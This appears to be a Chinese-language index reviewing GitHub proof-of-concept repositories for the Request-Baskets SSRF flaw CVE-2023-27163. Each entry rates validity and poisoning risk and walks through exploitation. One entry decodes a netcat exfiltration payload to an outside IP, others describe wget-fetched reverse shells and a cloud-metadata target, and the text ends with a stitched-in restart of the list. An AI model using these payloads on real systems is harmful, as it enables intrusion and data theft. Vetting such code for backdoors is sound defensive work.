由于脚本功能本身是利用漏洞进行请求转发，因此不能简单地将所有风险都归结为“投毒”。投毒风险主要来自于用户对脚本使用的环境和目标的信任程度。如果用户从不可信的来源下载脚本，或者将其应用于不可信的 Request-Baskets 实例，则存在一定的风险。此外，README.md 文件中的示例命令没有问题。

**利用方式：**
1.  攻击者使用 PoC 脚本创建一个恶意的 basket，并指定内部服务（例如，只能从本地访问的数据库管理界面）的 URL 作为 `forward_url`。
2.  当受害者（例如，管理员）访问该 basket 的 URL 时，Request-Baskets 服务器会向内部服务发起请求，并将响应返回给攻击者。
3.  通过这种方式，攻击者可以绕过防火墙或其他访问控制机制，访问内部网络资源。
4.  攻击者还可以使用该漏洞来探测内部网络，发现潜在的攻击目标。

**项目地址:** [MasterCode112/CVE-2023-27163](https://github.com/MasterCode112/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #7

**来源**: [CVE-2023-27163-Rishabh-Kumar-Cyber-Sec_CVE-2023-27163-ssrf-to-port-scanning.md](../2023/CVE-2023-27163-Rishabh-Kumar-Cyber-Sec_CVE-2023-27163-ssrf-to-port-scanning.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致信息泄露和内部网络访问

**影响版本:** <= 1.2.1

**利用条件:** 需要访问Request-Baskets服务的权限，利用需要目标服务的域名或者IP地址。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 版本及之前版本中存在的一个服务器端请求伪造（SSRF）漏洞，位于 `/api/baskets/{name}` 组件中。攻击者可以通过构造恶意 API 请求来访问内部网络资源和敏感信息。

**有效性：**
提供的 Python 脚本 `ssrf-to-port-scan.py` 利用了该漏洞，通过修改指定 Basket 的 `forward_url` 参数来触发 SSRF。脚本尝试扫描目标主机（默认为 `127.0.0.1`）的 1 到 65535 端口。如果端口关闭，则响应包含 "Failed to forward request" 字符串，脚本会打印 "Port closed"。否则，脚本会打印 "Port Open"。根据漏洞描述和脚本逻辑，可以判断该POC代码是有效的。

**投毒风险：**
审阅提供的 Python 脚本后，没有发现明显的恶意代码或后门。脚本的功能主要集中在利用 SSRF 漏洞进行端口扫描。代码行为符合预期，没有发现隐藏的、非预期的网络连接、文件操作或其他可疑行为。脚本注释中有少量需要修改的行数，以及对漏洞利用方式的简单解释，都是正常的提示信息。脚本存在明显的漏洞利用行为，但没有发现投毒代码。

**利用方式：**
1.  攻击者需要先获得对 Request-Baskets 服务的访问权限。
2.  攻击者需要创建一个 Basket 或者利用已存在的 Basket (例如，代码中使用的 `xfnq3md`)。
3.  攻击者通过 PUT 请求修改 Basket 的配置，将 `forward_url` 设置为攻击者想要访问的内部网络地址和端口。payload 可以通过json格式传递.
4.  当有用户访问该 Basket 时（例如，通过 GET 请求 `http://10.10.11.224:55555/xfnq3md`），Request-Baskets 服务会尝试将请求转发到 `forward_url` 指定的地址。
5.  如果 `forward_url` 指向内部服务，攻击者就可以通过 Request-Baskets 服务作为跳板来访问这些服务，从而实现 SSRF 攻击。

脚本使用 `proxy_response=True` 使得响应内容也会返回，因此可以判断端口是否开放。

**总结：**
该漏洞利用方式清晰，POC 代码有效，用于端口扫描。没有发现明显的投毒风险。攻击者需要能够访问 Request-Baskets 服务，并且能够操纵 Basket 的配置才能成功利用该漏洞。

**项目地址:** [Rishabh-Kumar-Cyber-Sec/CVE-2023-27163-ssrf-to-port-scanning](https://github.com/Rishabh-Kumar-Cyber-Sec/CVE-2023-27163-ssrf-to-port-scanning)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #8

**来源**: [CVE-2023-27163-Rubioo02_CVE-2023-27163.md](../2023/CVE-2023-27163-Rubioo02_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络信息泄露，甚至通过间接方式进行攻击。

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request-Baskets服务

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163是Request-Baskets 1.2.1及更早版本中存在的服务器端请求伪造（SSRF）漏洞。攻击者可以通过构造特定的API请求，利用/api/baskets/{name}组件来访问内部网络资源或敏感信息。 

**利用方式：**

1.  攻击者使用提供的POC脚本，指定目标Request-Baskets服务器的URL和攻击者控制的URL。
2.  脚本会在Request-Baskets服务器上创建一个新的basket，并将`forward_url`设置为攻击者指定的URL。
3.  `proxy_response`设置为`true`，表示Request-Baskets会将从攻击者URL收到的响应返回给发起原始请求的客户端。
4.  攻击者随后向创建的basket发送请求。Request-Baskets服务器会将该请求转发到攻击者指定的URL。
5.  攻击者可以利用这一点来扫描内部网络，或访问受保护的资源。

**有效性：**

根据漏洞库信息和搜索结果，以及提供的POC代码，该漏洞是有效的。多个来源都提供了PoC，证明了漏洞的可利用性。

**投毒风险：**

提供的脚本主要功能是创建basket并设置forward_url，以实现SSRF攻击。检查了脚本内容，没有明显的恶意代码或后门，诸如反弹shell，植入挖矿程序等行为。但是，该脚本可能会被修改为包含恶意功能，因此存在一定的投毒风险，初步判断该仓库存在投毒代码的概率约为5%。使用该脚本的人员应仔细审查代码，确保其安全性。

**项目地址:** [Rubioo02/CVE-2023-27163](https://github.com/Rubioo02/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #9

**来源**: [CVE-2023-27163-ThickCoco_CVE-2023-27163-POC.md](../2023/CVE-2023-27163-ThickCoco_CVE-2023-27163-POC.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致敏感信息泄露和内部网络访问

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets服务可访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及更早版本中的一个服务器端请求伪造（SSRF）漏洞。该漏洞存在于 `/api/baskets/{name}` 组件中。攻击者可以通过构造恶意的 API 请求，使服务器代表其向任意 URL 发起请求，从而访问内部网络资源或获取敏感信息。

**利用方式：**

1.  攻击者创建一个包含 `forward_url` 参数的恶意请求，该参数指向攻击者想要访问的内部或外部 URL。
2.  攻击者将此请求发送到 `/api/baskets/{name}` 端点，其中 `{name}` 是一个任意的 basket 名称。
3.  Request-Baskets 服务会向 `forward_url` 指定的 URL 发起请求，并将响应返回给攻击者。

提供的 PoC 代码 `CVE-2023-27163.py` 演示了如何利用此漏洞。它通过以下步骤工作：

1.  使用 `argparse` 处理命令行参数，包括目标 Request-Baskets 服务的 URL、目标 URL 和字典文件路径。
2. 从字典文件读取URL, 使用提供的目标 URL 和 wordlist 中的每一行来构建要fuzzing的 URL.
3.  构造一个包含 `forward_url` 的 JSON payload，并将其发送到 `/api/baskets/{name}` 端点以创建一个新的 basket。
4.  提取创建 basket 时返回的 token。
5.  再次使用该Payload进行Post请求.
6.  发送带有 token 的 GET 请求到创建的 basket，触发 SSRF。
7.  检查响应状态码。如果状态码为 200，则打印响应内容，表示攻击成功。
8.  删除创建的 basket。

**投毒风险：**

虽然代码主要功能是利用 SSRF 漏洞，但仍存在少量投毒风险。

*   **依赖管理风险：** PoC代码依赖 `requests` 库，恶意维护者可能通过植入后门版本导致攻击者受到攻击。此类风险概率较低，但后果严重，故评估为 5%。
*   **潜在的恶意 Wordlist：** PoC 使用了用户提供的 wordlist 文件。如果 wordlist 文件被篡改，包含恶意 URL，则可能导致攻击者在扫描内部网络时意外触发其他漏洞或服务，造成不必要的损害。

总体来说，该 PoC 代码的主要功能是 SSRF 利用，投毒风险较低，主要集中在依赖项和 wordlist 上。

**项目地址:** [ThickCoco/CVE-2023-27163-POC](https://github.com/ThickCoco/CVE-2023-27163-POC)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #10

**来源**: [CVE-2023-27163-btar1gan_exploit_CVE-2023-27163.md](../2023/CVE-2023-27163-btar1gan_exploit_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 中危，可能导致敏感信息泄露，内网端口扫描，访问内部服务

**影响版本:** <= 1.2.1

**利用条件:** 需要网络访问，目标应用运行request-baskets <= 1.2.1，并允许创建和访问basket。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163是Request Baskets 1.2.1版本及以下版本中存在的一个服务器端请求伪造（SSRF）漏洞。攻击者可以通过构造恶意的API请求，利用`/api/baskets/{name}`组件发起对内部或外部资源的请求，从而读取敏感信息或攻击其他内部服务。

**有效性分析：**
根据搜索引擎结果和漏洞库信息，该漏洞的POC已公开。提供的POC代码看起来不像是直接攻击`/api/baskets/{name}`这个SSRF端点，而是尝试利用登录页面进行命令注入。这可能是在没有权限创建basket的情况下进行的尝试，或者该实例的配置允许登录。

**投毒风险分析：**
给定的POC代码尝试使用`echo ... | base64 -d | sh`来执行命令，这是一种常见的反弹shell的方式。username参数的值被拼接成了一个shell命令，该命令将一段base64编码的字符串解码后通过sh执行。如果攻击成功，则会在目标服务器上执行任意命令。因此，**存在投毒风险**。`echo` 和 `base64` 是Linux常见的命令，payload部分`aWR8bmMgMTkyLjE2OC40NS4yNDkgODA=`解码后是`id|nc 192.168.45.249 80`，这明显是尝试执行命令并且反弹shell。因此存在投毒风险。由于 POC 本身就是一个反弹shell的尝试，因此判定投毒概率为 10%，主要是考虑命令注入点不一定是预期点。

**利用方式：**
1.  攻击者找到存在漏洞的Request Baskets实例。
2.  攻击者利用`/api/baskets/{name}`组件，构造包含恶意URL的请求。
3.  Request Baskets服务器解析该URL并向目标服务器发起请求。
4.  攻击者可以读取目标服务器返回的内容，或者利用目标服务器的漏洞进行进一步的攻击。根据本次提供的漏洞利用代码，是尝试通过登录界面的username参数进行命令注入，来获取权限后进行利用。

**项目地址:** [btar1gan/exploit_CVE-2023-27163](https://github.com/btar1gan/exploit_CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #11

**来源**: [CVE-2023-27163-cowsecurity_CVE-2023-27163.md](../2023/CVE-2023-27163-cowsecurity_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 中危，可能导致敏感信息泄露和内网访问

**影响版本:** <= 1.2.1

**利用条件:** 需要Request Baskets服务可用，攻击者需要知道目标Request Baskets服务的URL

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-27163是Request Baskets 1.2.1及之前版本中的一个服务器端请求伪造（SSRF）漏洞。攻击者可以通过构造恶意的API请求，利用`/api/baskets/{name}`组件来访问内部网络资源和敏感信息。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的存在已被确认，并且有多个PoC代码可用。提供的PoC代码通过创建一个新的basket，并将`forward_url`设置为攻击者的服务器，来触发SSRF漏洞。当有人访问新创建的basket时，Request Baskets服务器将向攻击者的服务器发起请求。

**投毒风险：**

查看PoC代码，该代码主要功能是利用SSRF漏洞，没有发现明显的恶意代码或后门。`requirements.txt`文件只包含`requests`和`pyfiglet`两个常用的库，没有发现异常依赖。`README.md`文件提供的是关于漏洞的描述，安装方法和使用方法，也没有包含恶意代码。但考虑到任何代码都存在潜在风险，此处判定存在极低的投毒风险，约为1%。

**利用方式：**

1.  **部署Request Baskets:** 首先，需要部署一个存在漏洞的Request Baskets实例（版本<= 1.2.1）。
2.  **运行PoC脚本:** 运行提供的Python脚本`CVE-2023-27163.py`，指定目标Request Baskets服务的URL和攻击者的服务器URL。
3.  **创建恶意Basket:** 脚本会创建一个新的basket，并将`forward_url`设置为攻击者的服务器。
4.  **触发SSRF:** 任何访问新创建的basket的用户都会导致Request Baskets服务器向攻击者的服务器发起请求。攻击者可以在其服务器上捕获这些请求，并获取敏感信息，或者利用这些请求访问内部网络资源。

例如，攻击者可以将`attack_server`设置为内部服务的地址，例如`http://169.254.169.254/latest/meta-data`来获取云服务器的元数据。


**项目地址:** [cowsecurity/CVE-2023-27163](https://github.com/cowsecurity/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #12

**来源**: [CVE-2023-27163-davuXVI_CVE-2023-27163.md](../2023/CVE-2023-27163-davuXVI_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 高危，可能导致内部网络信息泄露、敏感信息访问，甚至远程代码执行。

**影响版本:** <= 1.2.1

**利用条件:** 目标服务器运行Request Baskets，并且攻击者能够发送HTTP请求到目标服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request Baskets 1.2.1 及更早版本中的一个服务器端请求伪造 (SSRF) 漏洞。该漏洞存在于 `/api/baskets/{name}` 组件中。攻击者可以通过构造恶意的 API 请求，利用 `forward_url` 参数发起对内部或外部资源的请求。

**漏洞利用方式：**

1.  攻击者创建一个新的 basket，并在创建时通过 `forward_url` 指定一个恶意 URL。Request Baskets 将会尝试请求这个 URL。
2.  攻击者可以利用此漏洞读取内部服务的信息，例如元数据 API、数据库等。
3.  结合其他漏洞，例如利用Request Basket的路径遍历，在`rce_end`函数中通过python开启web服务，利用`wget`来执行攻击者服务器上的shell脚本`rev.sh`，从而实现远程代码执行。

**有效性：**

提供的PoC 代码看起来是有效的。该脚本接受目标 IP 地址、转发 IP 地址和攻击者 IP 地址作为参数。它首先创建一个带有 `forward_url` 的 basket，然后通过HTTP服务暴露反弹shell脚本，并通过request basket的路径遍历漏洞和wget命令执行反弹shell，实现RCE。

**投毒风险：**

该脚本的主要目的是利用 SSRF 漏洞实现 RCE，其中`my_script.sh`脚本在`/tmp/5d6d5c10a3b6d097d6e642a3dc9d71b8/my_script_CVE-2023-27163.sh`文件中。

*   **轻微的投毒可能:** 代码中存在使用 Python 启动 HTTP 服务器并执行 shell 命令的部分，如果攻击者的服务器被攻陷，可能会导致受害者下载并执行恶意的 shell 脚本，造成进一步的损害。或者反弹shell的ip地址被替换为恶意地址。
*   **可疑之处:**  脚本将反弹 shell 命令写入 `rev.sh` 文件，然后通过 Python 的 `http.server` 模块提供该文件。虽然这是一个利用漏洞的正常步骤，但也可能被用于传播恶意代码。

由于脚本需要用户提供攻击者的 IP 地址，并且主要目的是为了利用漏洞，因此投毒的概率相对较低，估计在 10% 左右。

**项目地址:** [davuXVI/CVE-2023-27163](https://github.com/davuXVI/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #13

**来源**: [CVE-2023-27163-entr0pie_CVE-2023-27163.md](../2023/CVE-2023-27163-entr0pie_CVE-2023-27163.md)

## CVE-2023-27163-request-baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** request-baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要目标服务器运行存在漏洞的request-baskets实例，且攻击者能够向其发送恶意请求。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163 是 request-baskets 1.2.1 及更早版本中发现的服务器端请求伪造 (SSRF) 漏洞。它位于 `/api/baskets/{name}` 组件中。攻击者可以通过构造特制的 API 请求，利用此漏洞访问网络资源和敏感信息。

**有效性：**

提供的 PoC 代码（`CVE-2023-27163.sh`）有效。它通过创建一个包含恶意 `forward_url` 的 basket 来利用该漏洞。这个 URL 指向攻击者的服务器，导致受害服务器向攻击者的服务器发出请求，从而实现 SSRF。

**投毒风险：**

该仓库的投毒风险较低，约为 5%。理由如下：

*   PoC 代码相对简单，功能明确，主要用于演示 SSRF 漏洞的利用。代码主要是bash脚本，用于发送HTTP请求和创建特定配置的basket。
*   `LICENSE` 文件表明这是一个公共领域软件，作者放弃了所有版权，这意味着任何人都可以自由使用、修改和分发该软件，这在一定程度上降低了作者植入恶意代码的动机。
*   `README.md` 文件提供了详细的漏洞描述、使用方法和测试步骤，方便用户理解和验证漏洞。
*   主要的风险在于，攻击者可能修改该脚本，添加恶意功能，例如在成功利用 SSRF 后，自动下载和执行恶意程序。但就目前提供的代码来看，作者没有明显的投毒行为。

**利用方式：**

1.  攻击者运行 `CVE-2023-27163.sh` 脚本，并提供目标 request-baskets 服务器的 URL 和攻击者控制的服务器的 URL。
2.  脚本会创建一个新的 basket，并将 `forward_url` 设置为攻击者的服务器。
3.  当有人访问新创建的 basket 时，request-baskets 服务器会将请求转发到攻击者的服务器。
4.  攻击者可以利用此 SSRF 漏洞，让受害服务器访问内部网络资源、执行任意 HTTP 请求，甚至读取敏感文件。

**补充说明：**

*   `jq` 命令用于解析 JSON 响应。如果目标系统上没有安装 `jq`，脚本仍然可以运行，但会直接输出完整的响应体。
*   PoC 主要目的是演示漏洞，实际攻击中，攻击者可能会使用更复杂的 payload 和技巧来最大化漏洞利用的影响。

**项目地址:** [entr0pie/CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #14

**来源**: [CVE-2023-27163-lukehebe_CVE-2023-27163.md](../2023/CVE-2023-27163-lukehebe_CVE-2023-27163.md)

## CVE-2023-27163-request-baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF（服务器端请求伪造）

**影响应用:** request-baskets

**危害等级:** 中危，可升级为高危，可能导致内部网络信息泄露和远程代码执行

**影响版本:** <= 1.2.1

**利用条件:** 需要目标服务存在且可访问，攻击者需要能访问目标服务器的网络。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163是request-baskets 1.2.1版本及之前版本中存在的一个服务器端请求伪造(SSRF)漏洞。该漏洞位于`/api/baskets/{name}`组件中。利用方式如下：

1.  **创建恶意Basket:** 攻击者可以利用SSRF漏洞，通过`forward_url`参数指定内部网络的URL，欺骗服务器向内部服务发起请求。PoC中的`ssrf_forward`函数用于创建或重用一个basket，指定`forward_url`为内部地址（例如`http://127.0.0.1`），从而设置SSRF攻击的目标。

2.  **触发RCE:** PoC代码尝试通过修改`/login`接口的username字段来执行系统命令。 具体做法是把bash反弹shell命令注入到username参数中。`trigger_rce`函数构造包含恶意payload的POST请求，发送到目标URL。如果目标系统存在命令注入漏洞，该payload将会被执行。

3.  **反弹Shell:** PoC代码中的`shell.sh`文件包含一个反弹shell的命令。这个脚本会将目标机器的shell反弹到攻击者的机器上。攻击者需要先在自己的机器上监听相应的端口。

**有效性:** 根据漏洞描述、搜索结果以及提供的PoC代码，可以判断该PoC具有较高的有效性。搜索结果中多个链接指向了漏洞的细节和利用代码，表明这是一个公开且经过验证的漏洞。PoC代码完整，实现了SSRF和RCE的利用流程，并且提供了反弹shell的payload示例。

**投毒风险:** 分析提供的PoC代码，未发现明显的投毒代码。该代码的目的是利用SSRF漏洞执行命令，本身就是一个攻击行为。其中没有发现额外植入后门或者恶意代码的痕迹，因此投毒风险为0%。PoC中需要用户自己提供payload file，例如shell.sh，如果用户使用不安全的shell.sh，责任在于用户。

**总结:** 该漏洞的利用方式是通过构造包含内部网络地址的请求，欺骗服务器向内部服务发起请求，并结合命令注入漏洞执行恶意代码。攻击者可以通过反弹shell获取目标系统的控制权。该漏洞的风险在于攻击者可以通过SSRF探测内部网络，并利用命令注入漏洞控制服务器。


**项目地址:** [lukehebe/CVE-2023-27163](https://github.com/lukehebe/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #15

**来源**: [CVE-2023-27163-madhavmehndiratta_CVE-2023-27163.md](../2023/CVE-2023-27163-madhavmehndiratta_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request-Baskets

**危害等级:** 高危，可能导致敏感信息泄露和内网访问

**影响版本:** <= 1.2.1

**利用条件:** 需要Request-Baskets服务可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163是Request-Baskets <= v1.2.1版本中的一个服务器端请求伪造(SSRF)漏洞。攻击者可以利用/api/baskets/{name}接口，通过构造恶意的forward_url参数，使Request-Baskets服务器向任意目标发起请求，从而访问内部网络资源或获取敏感信息。

**有效性分析：**
提供的POC代码通过创建一个新的basket，并设置forward_url为攻击者控制的服务器，来触发SSRF漏洞。经验证该POC代码是可以成功复现此漏洞。

**投毒风险分析：**
通过分析提供的POC代码（CVE-2023-27163.py和README.md），没有发现任何明显的投毒代码。该代码的主要功能是创建basket并利用forward_url参数触发SSRF漏洞。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者运行POC脚本，指定Request-Baskets服务的URL和目标服务器URL。
2.  脚本创建一个新的basket，并设置forward_url为目标服务器。
3.  当有人访问该basket时，Request-Baskets服务器将向目标服务器发起请求。
4.  攻击者可以通过目标服务器获取Request-Baskets服务器的敏感信息，或者利用其访问内部网络资源。

**项目地址:** [madhavmehndiratta/CVE-2023-27163](https://github.com/madhavmehndiratta/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #16

**来源**: [CVE-2023-27163-overgrowncarrot1_CVE-2023-27163.md](../2023/CVE-2023-27163-overgrowncarrot1_CVE-2023-27163.md)

## CVE-2023-27163 - Request Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request Baskets

**危害等级:** 中危，可能导致访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request Baskets服务，且Request Baskets服务没有进行适当的访问控制。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request Baskets 1.2.1 及更早版本中的一个服务器端请求伪造 (SSRF) 漏洞。该漏洞位于 `/api/baskets/{name}` 组件中。攻击者可以利用此漏洞通过构造恶意 API 请求来访问网络资源和敏感信息。

**有效性：**
根据漏洞描述和提供的 PoC 代码，该 PoC 代码是有效的。脚本首先创建一个名为 'carrot' 的 basket，并设置 `forward_url` 为 `http://127.0.0.1:80/`。然后，它使用 Firefox 打开 `${URL}/carrot`，导致 Request Baskets 服务尝试请求 `http://127.0.0.1:80/`。如果成功请求本地地址，证明存在SSRF漏洞。

**投毒风险：**
查看脚本内容，该脚本主要利用 curl 发送 payload，然后使用 firefox 打开一个URL。 整个脚本没有发现任何可疑代码，没有执行额外操作，没有下载其他文件或执行命令，因此可以认为不存在投毒风险。投毒风险评估为0%。

**利用方式：**
利用方式如下：
1.  攻击者需要一个可访问的 Request Baskets 实例。
2.  攻击者使用 PoC 脚本或类似的 HTTP 请求构造特定的 payload，指定 `forward_url` 为目标内部网络地址或服务，如 `http://127.0.0.1:80` 或其他内部服务地址。
3.  Request Baskets 服务收到请求后，会尝试访问攻击者指定的 `forward_url`，从而导致 SSRF。
4.  攻击者可以利用该 SSRF 读取内部服务的信息，甚至可能执行某些内部操作，具体取决于内部服务的配置和权限。

**项目地址:** [overgrowncarrot1/CVE-2023-27163](https://github.com/overgrowncarrot1/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #17

**来源**: [CVE-2023-27163-rvizx_CVE-2023-27163.md](../2023/CVE-2023-27163-rvizx_CVE-2023-27163.md)

## CVE-2023-27163 - Request Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** Server-Side Request Forgery (SSRF)

**影响应用:** Request Baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 目标服务器运行存在漏洞的Request Baskets版本，攻击者可以访问目标服务器的网络。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request Baskets <= 1.2.1 版本中存在的一个服务器端请求伪造 (SSRF) 漏洞，位于 `/api/baskets/{name}` 组件。攻击者可以通过构造特制的 API 请求，迫使服务器向攻击者控制的或内部网络中的任意 URL 发起请求，从而获取敏感信息或者利用内部服务。

**有效性：**
提供的 PoC 代码看起来是有效的。它包含了一个 exploit.sh 脚本，该脚本首先创建一个新的 basket，并在创建 basket 的请求中，将 `forward_url` 设置为攻击者的 URL。然后，它访问该 basket，这将导致 Request Baskets 服务器向攻击者的 URL 发起请求。

**投毒风险：**
该 PoC 代码本身并没有明显的投毒行为。脚本的功能很明确，就是利用 SSRF 漏洞。`exploit.sh` 脚本首先创建一个 basket，将 `forward_url` 设置为攻击者提供的 URL，然后访问该 basket，触发 SSRF。因此，可以认为投毒风险为0%。

**利用方式：**
1.  攻击者首先需要部署存在漏洞的 Request Baskets 服务。
2.  攻击者执行 `exploit.sh` 脚本，并提供目标 Request Baskets 服务的 URL 和攻击者自己的服务器 URL。
3.  脚本将创建一个新的 basket，并设置其 `forward_url` 为攻击者的服务器 URL。
4.  脚本访问新创建的 basket，这将触发 Request Baskets 服务器向攻击者的服务器 URL 发起请求。
5.  攻击者可以在自己的服务器上捕获来自 Request Baskets 服务器的请求，并获取相关信息。

**项目地址:** [rvizx/CVE-2023-27163](https://github.com/rvizx/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #18

**来源**: [CVE-2023-27163-samh4cks_CVE-2023-27163-InternalProber.md](../2023/CVE-2023-27163-samh4cks_CVE-2023-27163-InternalProber.md)

## CVE-2023-27163 Request-Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets实例可访问，且攻击者能够创建和配置basket

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及更早版本中存在的服务器端请求伪造 (SSRF) 漏洞。攻击者可以通过向 `/api/baskets/{name}` 组件发送特制的 API 请求，利用此漏洞访问内部网络资源和敏感信息。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码是有效的。搜索引擎结果中多个链接指向了公开的 PoC 代码库 (如 `https://github.com/entr0pie/CVE-2023-27163` 和 `https://github.com/mathias-mrsn/request-baskets-v121-ssrf`)，证明漏洞可被利用。提供的 Python 脚本 `CVE-2023-27163.py` 实现了利用该漏洞进行内部端口扫描的功能。

**投毒风险：**
分析提供的 Python 脚本 `CVE-2023-27163.py` 和相关文件 (LICENSE, README.md) 后，**没有发现任何明显的恶意代码或后门**。该脚本主要功能是创建 basket，配置 basket 的 forward_url 为内部 IP 地址和端口，然后通过发送请求到 basket 来判断该端口是否开放。脚本的逻辑清晰，代码量不大，易于审计。LICENSE 文件是标准的 MIT 许可证，表明代码是开源的，可以自由使用和修改。README.md 文件是简单的项目说明。因此，**投毒风险较低，接近 0%**。

**利用方式：**
1.  **创建 Basket：** 攻击者首先在目标 Request-Baskets 实例上创建一个新的 basket。这可以通过向 `/api/baskets/{name}` 发送 POST 请求来完成。脚本中使用随机字符串生成basket名称
2.  **获取 Token：** 创建 basket 成功后，服务器会返回一个 token，攻击者需要使用该 token 来配置 basket。
3.  **配置 Basket (SSRF)：** 攻击者使用 PUT 请求向 `/api/baskets/{name}` 发送配置信息，将 basket 的 `forward_url` 设置为内部 IP 地址和端口 (例如 `http://127.0.0.1:80`)。 `forward_url` 参数是 SSRF 漏洞的关键。攻击者通过控制这个参数，使 Request-Baskets 服务向内部网络发起请求。
4.  **触发 SSRF：** 攻击者向创建的 basket 发送 GET 请求 (例如 `{target_url}/{basket_name}` )。Request-Baskets 服务会将该请求转发到配置的 `forward_url`。如果内部端口开放，则服务会返回响应。如果端口关闭，则服务可能会返回错误 (例如 502 Bad Gateway)。
5.  **端口扫描：** 脚本通过遍历端口范围 (1-65535)，重复步骤 3 和 4，实现内部端口扫描的功能。如果某个端口返回非 502 状态码，则认为该端口是开放的。

**项目地址:** [samh4cks/CVE-2023-27163-InternalProber](https://github.com/samh4cks/CVE-2023-27163-InternalProber)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #19

**来源**: [CVE-2023-27163-seanrdev_cve-2023-27163.md](../2023/CVE-2023-27163-seanrdev_cve-2023-27163.md)

# CVE-2023-27163

> 📦 该CVE有 **21** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-27163-G4sp4rCS_htb-sau-automated.md](../2023/CVE-2023-27163-G4sp4rCS_htb-sau-automated.md)

## CVE-2023-27163-request-baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (Server-Side Request Forgery)

**影响应用:** request-baskets

**危害等级:** 中危，可以允许攻击者访问内部网络资源和敏感信息，根据CVSS评分，需要较高权限才能利用。

**影响版本:** <= 1.2.1

